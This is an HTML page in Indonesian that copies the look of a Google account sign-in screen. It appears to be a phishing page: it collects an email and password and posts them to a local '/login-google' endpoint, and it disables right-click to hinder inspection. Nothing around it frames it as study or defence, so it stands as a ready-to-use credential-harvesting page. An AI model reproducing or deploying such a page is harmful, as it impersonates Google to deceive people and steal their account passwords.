<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="X-UA-Compatible" content="ie=edge"><title>Login Google</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet"><link rel="stylesheet" href="css/index.css" type="text/css" media="all"></head><body oncontextmenu="return!1"><div class="container"><div class="logo"><img src="logo/Google_logo.svg.png" alt=""></div><div class="login"><div class="textlog">Login</div>Gunakan akun google anda. Akun akan ditambahkan ke perangkat ini dan tersedia untuk aplikasi google lainnya.</div><span class="more1">Pelajari lebih lanjut cara menggunakan akun anda.</span><div class="form-section"><form id="googleForm" class="form" action="/login-google" method="post" accept-charset="utf-8"><input class="email" type="email" name="email" id="email" placeholder="Email atau nomor telepon"> <span class="lupaem">Lupa email?</span> <input class="password" type="password" name="password" id="password" placeholder="Masukkan sandi"><div class="checksec" id="checksec"><input class="checkbox" type="checkbox" name="checkbox" id="checkbox"><label for="checkbox" class="text_checkbox">Tampilkan sandi</label></div><input type="hidden" name="google" id="google" value="Google"><div class="btnsec"><span class="lupasan">Lupa sandi?</span> <input type="submit" class="button" name="button" id="button" value="Selanjutnya"></div></form></div></div><script src="js/index.js" type="text/javascript" charset="utf-8"></script></body></html>
